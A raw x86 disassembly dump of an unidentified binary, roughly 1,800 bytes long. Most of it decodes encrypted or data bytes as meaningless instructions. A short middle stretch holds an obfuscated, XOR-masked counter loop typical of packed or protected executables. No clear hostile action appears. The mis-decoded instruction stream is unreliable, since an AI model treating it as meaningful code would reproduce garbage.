  41ecec:	and    cl,BYTE PTR ss:[ebp-0x2]
  41ecf0:	or     al,0xde
  41ecf2:	push   edi
  41ecf3:	mov    bh,0x41
  41ecf5:	mov    ebp,0xf9e5e1d1
  41ecfa:	loop   0x41eca4
  41ecfc:	xchg   edx,eax
  41ecfd:	push   ecx
  41ecfe:	cmp    DWORD PTR [edi+ecx*2],0xffffffe5
  41ed02:	mov    esi,0xfb3044da
  41ed07:	fs push esp
  41ed09:	dec    eax
  41ed0a:	sub    DWORD PTR [ebp+0x2b3e0e83],ecx
  41ed10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed11:	(bad)  
  41ed12:	dec    edx
  41ed13:	push   ss
  41ed14:	jp     0x41ecf0
  41ed16:	and    cl,BYTE PTR [esi]
  41ed18:	cdq    
  41ed19:	lods   al,BYTE PTR ds:[esi]
  41ed1a:	lea    ebx,[ebx-0x1d74443e]
  41ed20:	xchg   edx,eax
  41ed21:	xchg   esi,eax
  41ed22:	out    dx,al
  41ed23:	std    
  41ed24:	mov    al,0x51
  41ed26:	adc    bh,0x79
  41ed29:	jno    0x41ed02
  41ed2b:	push   DWORD PTR [eax+0x1b44c76a]
  41ed31:	ins    DWORD PTR es:[edi],dx
  41ed32:	sahf   
  41ed33:	jb     0x41ecdf
  41ed35:	pusha  
  41ed36:	mov    esp,0x11eb3048
  41ed3b:	push   edi
  41ed3c:	mov    ds,edx
  41ed3e:	inc    ebp
  41ed3f:	jmp    0x7c6b:0x40fa4a58
  41ed46:	(bad)  
  41ed47:	ror    ch,cl
  41ed49:	mov    dl,0xfb
  41ed4b:	pop    esi
  41ed4c:	xchg   BYTE PTR [esi],dh
  41ed4e:	dec    eax
  41ed4f:	imul   esp,DWORD PTR [ebx],0xefad50a5
  41ed55:	add    ebx,DWORD PTR [edx+0x7d]
  41ed58:	push   ds
  41ed59:	push   cs
  41ed5a:	jg     0x41edd4
  41ed5c:	mov    ebx,DWORD PTR [eax]
  41ed5e:	ins    DWORD PTR es:[edi],dx
  41ed5f:	mov    esi,0xedf2786d
  41ed64:	jns    0x41ed69
  41ed66:	fdivr  QWORD PTR [edx-0x2a1c7544]
  41ed6c:	adc    bh,BYTE PTR [edi]
  41ed6e:	inc    eax
  41ed6f:	rcr    DWORD PTR [edx+0x5bd432b3],1
  41ed75:	jmp    0x78ab203c
  41ed7a:	mov    ds,ebp
  41ed7c:	xor    BYTE PTR [ebx+0x70709cb1],dl
  41ed82:	dec    ebx
  41ed83:	add    BYTE PTR [edx-0x2864243],dh
  41ed89:	inc    esi
  41ed8a:	movlps xmm4,QWORD PTR [esp+eax*1-0x61]
  41ed8f:	xchg   esp,eax
  41ed90:	out    dx,eax
  41ed91:	sar    DWORD PTR [ebx+0x23],0xb0
  41ed95:	daa    
  41ed96:	sub    al,0x67
  41ed98:	retf   0xd4ba
  41ed9b:	cmp    BYTE PTR cs:[edi],cl
  41ed9e:	leave  
  41ed9f:	xor    BYTE PTR es:[ecx+0x6d],0x31
  41eda4:	adc    al,cl
  41eda6:	or     al,0x4d
  41eda8:	pop    ds
  41eda9:	fwait
  41edaa:	dec    ecx
  41edab:	mov    al,ds:0x862c9c74
  41edb0:	mov    ebx,0x58d41d24
  41edb5:	ret    0x9a1c
  41edb8:	mov    edx,DWORD PTR [edi+esi*4]
  41edbb:	jmp    0x41ed9d
  41edbd:	test   al,0x54
  41edbf:	sbb    ah,al
  41edc1:	cmp    al,0xa6
  41edc3:	push   0x8b5add65
  41edc8:	test   eax,0xa9d3041c
  41edcd:	hlt    
  41edce:	adc    BYTE PTR [ecx+0x79],al
  41edd1:	enter  0xfd39,0x75
  41edd5:	call   0xf495:0x34f8281b
  41eddc:	aaa    
  41eddd:	add    eax,0xe362041f
  41ede2:	dec    edi
  41ede3:	push   es
  41ede4:	(bad)  
  41ede5:	jno    0x41ed76
  41ede7:	loope  0x41edb0
  41ede9:	adc    cl,ah
  41edeb:	and    BYTE PTR [ecx+0x7ff7a7ee],al
  41edf1:	mov    ebp,DWORD PTR [esi]
  41edf3:	ret    0x1bbf
  41edf6:	int    0xe6
  41edf8:	and    eax,0x5f3e3ab5
  41edfd:	jg     0x41ee7b
  41edff:	repnz in al,0x57
  41ee02:	and    al,0x5e
  41ee04:	std    
  41ee05:	(bad)  
  41ee06:	imul   ebp,DWORD PTR [esi+0x69],0x53d065de
  41ee0d:	int3   
  41ee0e:	mov    BYTE PTR [ebx+0x51],ch
  41ee11:	adc    DWORD PTR [ebp-0x3a],esp
  41ee14:	add    DWORD PTR [eax-0xab9dd09],ecx
  41ee1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee1b:	jmp    0xe63:0x33fc8d85
  41ee22:	pop    eax
  41ee23:	adc    DWORD PTR [ebp-0x36],ecx
  41ee26:	mov    dh,0xe1
  41ee28:	aas    
  41ee29:	in     al,0x45
  41ee2b:	inc    esp
  41ee2c:	inc    edi
  41ee2d:	mov    ?,ebp
  41ee2f:	aam    0x53
  41ee31:	test   al,0xb6
  41ee33:	jmp    0x41ee33
  41ee35:	jmp    0x41ee1e
  41ee37:	add    DWORD PTR [ecx-0x54],ebp
  41ee3a:	addr16 scas eax,DWORD PTR es:[di]
  41ee3d:	rcl    DWORD PTR [edi-0xf],0xbb
  41ee41:	cdq    
  41ee42:	mov    esi,0x535ab4b6
  41ee47:	aaa    
  41ee48:	xor    cl,BYTE PTR [ebx-0x372adc89]
  41ee4e:	or     edi,DWORD PTR [ecx+0x68e141d]
  41ee54:	minps  xmm3,XMMWORD PTR [ecx-0x1952840b]
  41ee5b:	adc    eax,ebx
  41ee5d:	mov    fs,WORD PTR [ecx+0x2f]
  41ee60:	in     eax,0x5b
  41ee62:	and    BYTE PTR [ecx+ecx*8+0x6d],cl
  41ee66:	daa    
  41ee67:	adc    cl,ah
  41ee69:	mov    eax,ds:0xefb065c2
  41ee6e:	shl    ecx,1
  41ee70:	shl    DWORD PTR [eax],cl
  41ee72:	in     eax,dx
  41ee73:	(bad)
  41ee77:	xor    ah,ah
  41ee79:	push   esp
  41ee7a:	pop    ebp
  41ee7b:	stos   DWORD PTR es:[edi],eax
  41ee7c:	jp     0x41ee37
  41ee7e:	pop    esi
  41ee7f:	sar    DWORD PTR [ebx+ebp*1],0xf0
  41ee83:	je     0x41eebc
  41ee85:	add    al,0xc2
  41ee87:	mov    al,ds:0x43882ec3
  41ee8c:	push   edx
  41ee8d:	mov    eax,ds:0x342c3a9b
  41ee92:	pop    ds
  41ee93:	dec    esi
  41ee94:	add    DWORD PTR ds:0x6d04c9e9,ecx
  41ee9a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41ee9c:	adc    BYTE PTR [ebp+0x40],0x5e
  41eea0:	stos   BYTE PTR es:[edi],al
  41eea1:	inc    esi
  41eea2:	cmp    al,0x2
  41eea4:	push   0x8226257a
  41eea9:	or     edx,ebp
  41eeab:	push   ss
  41eeac:	loopne 0x41ef21
  41eeae:	stos   DWORD PTR es:[edi],eax
  41eeaf:	out    dx,al
  41eeb0:	(bad)  
  41eeb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeb3:	(bad)  
  41eeb4:	(bad)  
  41eeb5:	xor    eax,0x541bff44
  41eeba:	xchg   ebp,eax
  41eebb:	cs cmp al,0xd6
  41eebe:	ss fs add al,0x33
  41eec2:	inc    ecx
  41eec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec4:	jl     0x41ef09
  41eec6:	sub    al,BYTE PTR [eax-0x3f]
  41eec9:	aam    0xde
  41eecb:	adc    esp,ebx
  41eecd:	loopne 0x41ee6c
  41eecf:	mov    bh,0x23
  41eed1:	adc    ebx,DWORD PTR [ebp+ebx*2-0x4699cb72]
  41eed8:	add    BYTE PTR [ebp+0x3a26313d],ah
  41eede:	mov    cl,0x26
  41eee0:	sbb    bl,BYTE PTR [edx+0x38]
  41eee3:	jmp    0xeb9569f2
  41eee8:	in     eax,0xc0
  41eeea:	pop    edx
  41eeeb:	nop
  41eeec:	add    DWORD PTR [esi-0x79030e76],eax
  41eef2:	push   ds
  41eef3:	jns    0x41eefc
  41eef5:	and    BYTE PTR [esi],bl
  41eef7:	retf   0x366a
  41eefa:	sub    al,0xb7
  41eefc:	jmp    0x41ef4f
  41eefe:	sub    ebp,edi
  41ef00:	xchg   ebx,eax
  41ef01:	mov    WORD PTR [edi-0x76],?
  41ef04:	push   esi
  41ef05:	int3   
  41ef06:	mov    ah,0x30
  41ef08:	xor    DWORD PTR [ebp-0x2d],edx
  41ef0b:	nop
  41ef0c:	sbb    BYTE PTR [esi-0xb],bh
  41ef0f:	xor    eax,0xb7e682ac
  41ef14:	aaa    
  41ef15:	xchg   esi,eax
  41ef16:	inc    edi
  41ef17:	mov    bl,0xbc
  41ef1a:	loopne 0x41ef15
  41ef1c:	jp     0x41ef10
  41ef1e:	sub    eax,0x7f60d7aa
  41ef23:	mov    dh,0x82
  41ef25:	sub    ebx,DWORD PTR [bp+di-0x6bea]
  41ef2a:	xchg   ecx,eax
  41ef2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef2c:	xchg   edi,eax
  41ef2d:	dec    esp
  41ef2e:	or     DWORD PTR [edx-0x7d9b50d5],esi
  41ef34:	scas   al,BYTE PTR es:[edi]
  41ef35:	jmp    0xfe0c:0xbb236dd2
  41ef3c:	repnz sar al,cl
  41ef3f:	cmc    
  41ef40:	stos   DWORD PTR es:[edi],eax
  41ef41:	(bad)  
  41ef42:	mov    eax,ds:0x1ae8173d
  41ef47:	loop   0x41ef57
  41ef49:	pop    esp
  41ef4a:	ret    0x5f47
  41ef4d:	jle    0x41efbb
  41ef4f:	retf   
  41ef50:	push   es
  41ef51:	pop    ds
  41ef52:	inc    edi
  41ef53:	retw   0x85a8
  41ef57:	out    0xa5,eax
  41ef59:	ja     0x41ef81
  41ef5b:	cmp    eax,0xd0926756
  41ef60:	fs sti 
  41ef62:	fcomi  st,st(1)
  41ef64:	fbld   TBYTE PTR [edi+0x3f]
  41ef67:	dec    edx
  41ef68:	xor    bh,BYTE PTR [eax-0x37]
  41ef6b:	add    al,0x1e
  41ef6d:	jmp    0x97524251
  41ef72:	adc    DWORD PTR [edx+0x46],0x6
  41ef76:	outs   dx,DWORD PTR ds:[esi]
  41ef77:	push   ebx
  41ef78:	push   edi
  41ef79:	repnz mov cl,0x41
  41ef7c:	jmp    0xdb70:0xdbca17c4
  41ef83:	das    
  41ef84:	pop    es
  41ef85:	dec    ecx
  41ef86:	loope  0x41ef2e
  41ef88:	bound  edi,QWORD PTR [edi+0x7f]
  41ef8b:	inc    edi
  41ef8c:	adc    DWORD PTR [edi],0xeccdaac6
  41ef92:	add    DWORD PTR [edi-0x5e],ecx
  41ef95:	out    0x64,al
  41ef97:	xchg   esi,eax
  41ef98:	xchg   ebp,eax
  41ef99:	cmp    eax,0xaea05ad8
  41ef9e:	add    eax,ecx
  41efa0:	pop    esp
  41efa1:	iret   
  41efa2:	cmp    DWORD PTR ds:0x7f839653,ebx
  41efa8:	in     eax,0x75
  41efaa:	ins    DWORD PTR es:[edi],dx
  41efab:	sub    BYTE PTR [eax],dh
  41efad:	fstp   QWORD PTR [esi-0x62a9c387]
  41efb3:	and    eax,eax
  41efb5:	imul   esi,eax,0x5cde65ba
  41efbb:	lahf   
  41efbc:	fnstenv [ebx-0x70]
  41efbf:	sbb    dl,0x14
  41efc2:	fs inc edi
  41efc4:	scas   al,BYTE PTR es:[edi]
  41efc5:	cmp    eax,0x320cac5d
  41efca:	ds inc esp
  41efcc:	iret   
  41efcd:	xlat   BYTE PTR ds:[ebx]
  41efce:	lods   eax,DWORD PTR ds:[esi]
  41efcf:	mov    eax,ds:0xe3b3ff72
  41efd4:	mov    ebp,0xc11b9c0e
  41efd9:	mov    ah,0x3b
  41efdb:	jnp    0x41eff2
  41efdd:	dec    edx
  41efde:	push   esi
  41efdf:	inc    sp
  41efe1:	inc    esp
  41efe2:	loope  0x41ef80
  41efe4:	mov    bh,0x1
  41efe6:	dec    ebp
  41efe7:	dec    ebx
  41efe8:	fucomi st,st(1)
  41efea:	mov    WORD PTR [ebp+0x57d076b8],cs
  41eff0:	popa   
  41eff1:	mov    esp,0xab44cdad
  41eff6:	push   ebp
  41eff7:	leave  
  41eff8:	mov    ch,BYTE PTR [ebx]
  41effa:	and    al,0x24
  41effc:	dec    esp
  41effd:	inc    esp
  41effe:	xor    ecx,eax
  41f000:	add    ecx,esi
  41f002:	jne    0x41cc6b
  41f008:	mov    ecx,DWORD PTR [ebp-0xc]
  41f00b:	mov    DWORD PTR [ebp+0x8],ecx
  41f00e:	jmp    0x41f040
  41f013:	mov    ecx,DWORD PTR [ebp+0x8]
  41f016:	mov    edx,DWORD PTR [ebp-0x8]
  41f019:	xor    ecx,eax
  41f01b:	xor    edx,eax
  41f01d:	sub    ecx,edx
  41f01f:	sub    ecx,esi
  41f021:	xor    ecx,eax
  41f023:	mov    DWORD PTR [ebp+0x8],ecx
  41f026:	mov    ecx,DWORD PTR [ebp+0x8]
  41f029:	mov    edx,DWORD PTR [ebp+0x8]
  41f02c:	imul   edx,edx,0x5708f5
  41f032:	xor    ecx,eax
  41f034:	add    ecx,esi
  41f036:	lea    ecx,[ebp+ecx*4-0x64]
  41f03a:	mov    edi,DWORD PTR [ecx]
  41f03c:	add    edx,edi
  41f03e:	mov    DWORD PTR [ecx],edx
  41f040:	mov    ecx,DWORD PTR [ebp+0x8]
  41f043:	xor    ecx,eax
  41f045:	add    ecx,esi
  41f047:	jne    0x41f013
  41f04d:	mov    ecx,DWORD PTR [ebp-0x8]
  41f050:	mov    edx,DWORD PTR [ebp-0x20]
  41f053:	xor    ecx,eax
  41f055:	lea    ecx,[ecx+edx*1+0x3272db]
  41f05c:	mov    DWORD PTR [ebp-0x20],ecx
  41f05f:	inc    DWORD PTR [ebp+0xc]
  41f062:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f065:	xor    ecx,eax
  41f067:	add    ecx,esi
  41f069:	jne    0x41cb20
  41f06f:	jmp    0x42145b
  41f074:	mov    ecx,DWORD PTR [ebp-0xc]
  41f077:	mov    DWORD PTR [ebp+0x8],ecx
  41f07a:	jmp    0x42140f
  41f07f:	mov    ecx,DWORD PTR [ebp+0x8]
  41f082:	mov    edx,DWORD PTR [ebp-0x8]
  41f085:	xor    ecx,eax
  41f087:	xor    edx,eax
  41f089:	sub    ecx,edx
  41f08b:	sub    ecx,esi
  41f08d:	xor    ecx,eax
  41f08f:	mov    DWORD PTR [ebp+0x8],ecx
  41f092:	mov    ecx,DWORD PTR [ebp+0x8]
  41f095:	mov    edx,DWORD PTR [ebp+0x8]
  41f098:	imul   edx,edx,0x5708f5
  41f09e:	xor    ecx,eax
  41f0a0:	add    ecx,esi
  41f0a2:	lea    ecx,[ebp+ecx*4-0x64]
  41f0a6:	mov    edi,DWORD PTR [ecx]
  41f0a8:	add    edx,edi
  41f0aa:	mov    DWORD PTR [ecx],edx
  41f0ac:	jmp    0x42140f
  41f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0b2:	or     ah,bl
  41f0b4:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x152a6403
  41f0bf:	push   edx
  41f0c0:	and    edx,DWORD PTR [ecx-0x28]
  41f0c3:	popa   
  41f0c4:	bound  edi,QWORD PTR [edi+ebx*2]
  41f0c7:	bound  esp,QWORD PTR [edx-0x7c]
  41f0ca:	or     ch,BYTE PTR [edi+0x50718e8c]
  41f0d0:	pop    es
  41f0d1:	inc    edi
  41f0d2:	retf   0x6da6
  41f0d5:	scas   al,BYTE PTR es:[edi]
  41f0d6:	mov    es,WORD PTR [edx+0x34]
  41f0d9:	jbe    0x41f076
  41f0db:	imul   esp,DWORD PTR [edi+0x2a],0xffffffd0
  41f0df:	push   es
  41f0e0:	mov    es,WORD PTR [edx+0x6d9d1841]
  41f0e6:	and    BYTE PTR [ebx],ah
  41f0e8:	sub    al,0x1f
  41f0ea:	mov    bl,0xf7
  41f0ec:	mov    al,0x2c
  41f0ee:	ja     0x41f0f3
  41f0f0:	shr    ah,1
  41f0f2:	sti    
  41f0f3:	add    al,0xed
  41f0f6:	scas   eax,DWORD PTR es:[edi]
  41f0f7:	jmp    0xb8b6:0xc429cf61
  41f0fe:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f100:	cmp    BYTE PTR [ebx+0x1098dc81],dh
  41f106:	push   0x160a7b22
  41f10b:	adc    edi,edi
  41f10d:	mov    ecx,0x29a24a74
  41f112:	sbb    ecx,0x357abbd4
  41f118:	adc    al,0x36
  41f11a:	(bad)  
  41f11b:	xlat   BYTE PTR ds:[ebx]
  41f11c:	sbb    eax,0xe91a3342
  41f121:	pushf  
  41f122:	cmp    BYTE PTR [esi],0x5
  41f125:	loop   0x41f146
  41f127:	xchg   esi,eax
  41f128:	test   dh,0x87
  41f12b:	mov    BYTE PTR es:[edi-0x5d23303d],bh
  41f132:	mov    ds:0xc1fbd0b9,al
  41f137:	rdpmc  
  41f139:	or     dl,BYTE PTR [ecx+0x39c0fd1f]
  41f13f:	mov    edi,DWORD PTR [eax-0x42]
  41f142:	push   ebp
  41f143:	push   edi
  41f144:	mov    edi,0x4e0f71b7
  41f149:	sbb    eax,0x4c252f3c
  41f14e:	xor    al,0xb3
  41f150:	dec    esp
  41f151:	(bad)  
  41f152:	xchg   ebp,eax
  41f153:	lock pop ds
  41f155:	clc    
  41f156:	mov    ebp,edx
  41f158:	into   
  41f159:	cmp    BYTE PTR [ecx-0x51],dl
  41f15c:	and    BYTE PTR [ebx+0x23],dl
  41f15f:	div    al
  41f161:	sbb    al,0xb5
  41f163:	js     0x41f1b9
  41f165:	in     al,dx
  41f166:	test   al,0xf
  41f168:	sbb    DWORD PTR [edx+0x5],0xffffffe3
  41f16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f16d:	xor    al,0x48
  41f16f:	mov    ds:0x68324599,al
  41f174:	sub    cl,al
  41f176:	inc    ecx
  41f177:	dec    esi
  41f178:	sub    DWORD PTR [eax+0x52],esp
  41f17b:	fs nop
  41f17d:	mov    ebp,0xd1c8beb3
  41f182:	and    al,0xf8
  41f184:	sbb    eax,0xee447beb
  41f189:	imul   esp,DWORD PTR [esi-0x25],0x26
  41f18d:	sbb    eax,0x3c0ef894
  41f192:	pop    ebp
  41f193:	sbb    DWORD PTR [ebp-0x4a],ebp
  41f196:	push   ecx
  41f197:	in     eax,0x76
  41f199:	ss jle 0x41f1d2
  41f19c:	fidivr WORD PTR [esi+0xc9176a2]
  41f1a2:	or     DWORD PTR [eax+edx*2+0x30],ecx
  41f1a6:	sbb    eax,ebp
  41f1a8:	push   esi
  41f1a9:	mov    ds:0x71d169bb,eax
  41f1ae:	pop    edi
  41f1af:	jp     0x41f1c9
  41f1b1:	jmp    0x287c:0xd5382514
  41f1b8:	adc    dh,dh
  41f1ba:	add    DWORD PTR [edx+0x5f],0x67864e80
  41f1c1:	std    
  41f1c2:	leave  
  41f1c3:	stc    
  41f1c4:	icebp  
  41f1c5:	jl     0x41f1dd
  41f1c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1c8:	inc    eax
  41f1c9:	cmp    eax,0xc3240ce3
  41f1ce:	sub    BYTE PTR [esp+eax*4],ah
  41f1d1:	xlat   BYTE PTR ds:[ebx]
  41f1d2:	int3   
  41f1d3:	sbb    eax,0x808e2d6d
  41f1d8:	add    BYTE PTR [esi+0x2b512255],ah
  41f1de:	lods   eax,DWORD PTR ds:[si]
  41f1e0:	aad    0x3b
  41f1e2:	clc    
  41f1e3:	fisttp WORD PTR [edi-0x7e00cabd]
  41f1e9:	jmp    0x47ca:0xb9df28ed
  41f1f0:	add    al,0x24
  41f1f2:	mov    eax,ds:0x390648a0
  41f1f7:	mov    dl,0xdf
  41f1f9:	pop    eax
  41f1fa:	imul   eax,DWORD PTR [esi],0xb358011d
  41f200:	(bad)  
  41f201:	xchg   ebp,eax
  41f202:	scas   al,BYTE PTR es:[edi]
  41f203:	out    dx,al
  41f204:	jnp    0x41f267
  41f206:	fs jae 0x41f23d
  41f209:	in     eax,dx
  41f20a:	sub    eax,0x576d07db
  41f20f:	inc    edi
  41f210:	je     0x41f1dd
  41f212:	nop
  41f213:	sub    ah,BYTE PTR [ecx+0x16]
  41f216:	rol    BYTE PTR [ecx-0x44a11c5a],1
  41f21c:	aam    0x61
  41f21e:	cmp    al,0x2f
  41f220:	xor    ebx,DWORD PTR [eax+esi*8+0x5c3a3c58]
  41f227:	mov    ah,0x2a
  41f229:	xchg   ebx,eax
  41f22a:	scas   eax,DWORD PTR es:[edi]
  41f22b:	js     0x41f1ca
  41f22d:	hlt    
  41f22e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f22f:	pop    eax
  41f230:	and    esi,DWORD PTR [ebx-0x32]
  41f233:	out    0xe4,eax
  41f235:	cmp    eax,0xa1b4fef2
  41f23a:	test   eax,0x2e6c119d
  41f23f:	sbb    eax,esi
  41f241:	sahf   
  41f242:	jno    0x41f1cb
  41f244:	and    DWORD PTR [ebp+0x4d37e06d],0xffffff95
  41f24b:	cmp    BYTE PTR [esi+0x533dd69],ch
  41f251:	xor    ebp,DWORD PTR [ebx-0x6b]
  41f254:	iret   
  41f255:	push   eax
  41f256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f257:	adc    BYTE PTR [edx],ch
  41f259:	adc    eax,DWORD PTR [edx-0x5d]
  41f25c:	adc    dh,cl
  41f25e:	pop    edi
  41f25f:	stos   BYTE PTR es:[edi],al
  41f260:	inc    eax
  41f261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f262:	arpl   WORD PTR [ecx-0x35],di
  41f265:	and    esi,DWORD PTR [ecx]
  41f267:	jle    0x41f2aa
  41f269:	es jno 0x41f267
  41f26c:	add    esi,DWORD PTR [ebp+0x6c]
  41f26f:	loop   0x41f25c
  41f271:	add    edi,DWORD PTR [esi+edi*4]
  41f274:	daa    
  41f275:	div    edx
  41f277:	lods   eax,DWORD PTR ds:[esi]
  41f278:	xchg   ebx,eax
  41f279:	(bad)  
  41f27a:	jecxz  0x41f28f
  41f27c:	adc    esi,DWORD PTR [ecx-0x53]
  41f27f:	xchg   DWORD PTR [esi+0x40b7b6e1],edi
  41f285:	pop    ss
  41f286:	in     eax,0x5
  41f288:	mov    al,ds:0x82a8505f
  41f28d:	es dec edx
  41f28f:	mov    ecx,0x2fd0887e
  41f294:	ret    
  41f295:	cdq    
  41f296:	mov    edx,0xac443927
  41f29b:	ins    DWORD PTR es:[edi],dx
  41f29c:	push   ss
  41f29d:	ret    
  41f29e:	jo     0x41f2d1
  41f2a0:	fwait
  41f2a1:	test   DWORD PTR [esp+eiz*4+0x6b],edx
  41f2a5:	inc    esi
  41f2a6:	loop   0x41f26b
  41f2a8:	jo     0x41f2f8
  41f2aa:	nop
  41f2ab:	jge    0x41f318
  41f2ad:	shl    DWORD PTR [esi],cl
  41f2af:	xchg   edx,eax
  41f2b0:	and    DWORD PTR [edx+esi*4],ebp
  41f2b3:	cwde   
  41f2b4:	and    BYTE PTR [esi-0x50],bh
  41f2b7:	cli    
  41f2b8:	mov    esp,0x4b0fda37
  41f2bd:	push   ss
  41f2be:	xchg   BYTE PTR [eax-0x718385a0],bh
  41f2c4:	mov    bl,0x29
  41f2c6:	ror    DWORD PTR [ebx+0x8d2f0d8],0xb2
  41f2cd:	pushf  
  41f2ce:	sbb    ebx,esp
  41f2d0:	sbb    al,0x8a
  41f2d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2d4:	xlat   BYTE PTR ds:[ebx]
  41f2d5:	test   eax,0xa7fde29e
  41f2da:	and    edx,edx
  41f2dc:	cmp    dh,BYTE PTR [edi+0x113c6ef1]
  41f2e2:	jmp    DWORD PTR [esi+0x7]
  41f2e5:	xor    edi,edi
  41f2e7:	inc    ebp
  41f2e8:	xor    al,0x8
  41f2ea:	(bad)  
  41f2eb:	mov    ecx,0x7571ed56
  41f2f0:	daa    
  41f2f1:	fisub  DWORD PTR [ebx-0x2fa8482f]
  41f2f7:	retf   
  41f2f8:	pop    eax
  41f2f9:	in     eax,0xad
  41f2fb:	ins    BYTE PTR es:[edi],dx
  41f2fc:	sbb    ebp,DWORD PTR [eax-0x6d5e1ef4]
  41f302:	and    eax,0xd4aeeb84
  41f307:	cli    
  41f308:	(bad)  [esi]
  41f30a:	adc    esp,ebx
  41f30c:	retf   0xbdbb
  41f30f:	aad    0x31
  41f311:	mov    ebx,ss
  41f313:	ss cmp al,0x81
  41f316:	push   0x74
  41f318:	pop    esi
  41f319:	out    0x0,eax
  41f31b:	sahf   
  41f31c:	and    al,ah
  41f31e:	out    dx,al
  41f31f:	ror    al,cl
  41f321:	push   esi
  41f322:	pop    esi
  41f323:	xchg   edi,eax
  41f324:	and    bh,BYTE PTR [edi-0x5d]
  41f327:	or     DWORD PTR [edx-0x25],ebp
  41f32a:	repz in eax,0xf8
  41f32d:	jo     0x41f33b
  41f32f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f330:	push   ds
  41f331:	push   ds
  41f332:	add    al,0x84
  41f334:	mov    al,0x48
  41f336:	ds stos DWORD PTR es:[edi],eax
  41f338:	mov    eax,0x1d21b4b4
  41f33d:	jle    0x41f3ad
  41f33f:	mov    WORD PTR [edi+0x63],gs
  41f342:	loop   0x41f2ef
  41f344:	and    al,0x62
  41f346:	inc    edx
  41f347:	out    dx,eax
  41f348:	mov    al,0x97
  41f34a:	adc    ebx,DWORD PTR [ecx+0x21710cd9]
  41f350:	gs in  eax,0x56
  41f353:	dec    edi
  41f354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f355:	into   
  41f356:	jb     0x41f32c
  41f358:	mov    al,0xa1
  41f35a:	xlat   BYTE PTR ds:[ebx]
  41f35b:	cmc    
  41f35c:	call   0xc4ec:0x96f8ffb6
  41f363:	(bad)  
  41f364:	(bad)  
  41f365:	imul   ecx,DWORD PTR [ebx+ebx*2],0x7a
  41f369:	push   esi
  41f36a:	or     eax,DWORD PTR [eax+0x2b7b170f]
  41f370:	or     ah,ah
  41f372:	frstor [edi+0x59147c9c]
  41f378:	and    esi,DWORD PTR [ecx]
  41f37a:	stc    
  41f37b:	jmp    0x8f99:0xa7918ae9
  41f382:	cmp    BYTE PTR [di+0x40],al
  41f386:	push   0x43bb6653
  41f38b:	push   edx
  41f38c:	adc    esp,DWORD PTR [eax+0x12]
  41f38f:	dec    eax
  41f390:	int    0x1f
  41f392:	lock lock jno 0x41f391
  41f396:	cwde   
  41f397:	cmp    eax,0xf9c087d2
  41f39c:	test   al,0x38
  41f39e:	out    0x34,al
  41f3a0:	jecxz  0x41f366
  41f3a2:	clc    
  41f3a3:	in     eax,dx
  41f3a4:	cwde   
  41f3a5:	sbb    ch,ah
  41f3a7:	(bad)  
  41f3a9:	in     eax,dx
  41f3aa:	in     eax,dx
  41f3ab:	out    0x22,eax
  41f3ad:	add    esp,DWORD PTR gs:[esi]
  41f3b0:	jge    0x41f3a0
  41f3b2:	jbe    0x41f40c
  41f3b4:	pop    esi
  41f3b5:	mov    al,0x8e
  41f3b7:	mov    bl,0x14
  41f3b9:	adc    DWORD PTR [ebx+ecx*1],0xffffffcd
  41f3bd:	sub    dh,bl
  41f3bf:	adc    BYTE PTR [ebx-0x60475e42],bh
  41f3c5:	vshufps xmm0,xmm7,xmm5,0x47
  41f3ca:	loopne 0x41f3f4
  41f3cc:	daa    
  41f3cd:	mov    cl,0xd4
  41f3cf:	lods   al,BYTE PTR ds:[esi]
  41f3d0:	xchg   esi,eax
  41f3d1:	push   es
  41f3d2:	ret    0x233
  41f3d5:	(bad)  [ebx+edx*8-0x27b93d6]
  41f3dc:	jl     0x41f3f5
  41f3de:	jno    0x41f3cc
  41f3e0:	mov    ds:0xe59c20f,al
  41f3e5:	push   0xffffffc3
  41f3e7:	adc    DWORD PTR [ecx],ebp
  41f3e9:	scas   al,BYTE PTR es:[edi]
  41f3ea:	ret    
  41f3eb:	cmp    BYTE PTR ds:0xfa0878ef,0x72
  41f3f2:	out    0xcc,al
  41f3f4:	popf   
  41f3f5:	sahf   
  41f3f6:	mov    ebx,0xa3e472d5
  41f3fb:	dec    ebp
  41f3fc:	pop    edx
  41f3fd:	test   DWORD PTR [edi-0x2de30e02],ebx
  41f403:	dec    esi
  41f404:	lds    ebp,FWORD PTR [edi]
  41f406:	or     DWORD PTR [ebp-0x3161eef7],esp
  41f40c:	xchg   edx,eax
  41f40d:	or     ebp,DWORD PTR [edx]
  41f40f:	push   esp
  41f410:	cmp    BYTE PTR [eax-0x5b],0x20
  41f414:	cmc    
  41f415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f416:	stc    
  41f417:	imul   ecx,ebp,0x904902f6
  41f41d:	shl    DWORD PTR [eax],1
  41f41f:	jge    0x41f43f
  41f421:	gs cmp eax,0x3ce3d806
  41f427:	inc    ebp
  41f428:	rcr    DWORD PTR [ebx+0x7297392e],1
  41f42e:	iret   
  41f42f:	into   
  41f430:	inc    ecx
  41f431:	mov    ch,0xd8
  41f433:	sub    ah,ch
  41f435:	mov    eax,ds:0x9c166d5f
  41f43a:	xor    ah,BYTE PTR [edx+eax*1-0x687ce280]
  41f441:	mov    dl,BYTE PTR [esi-0x2e2852b5]
  41f447:	dec    esi
  41f448:	cwde   
  41f449:	stos   DWORD PTR es:[edi],eax
  41f44a:	dec    esi
  41f44b:	popf   
  41f44c:	add    al,0xdc
  41f44e:	sub    eax,0x9b026c97
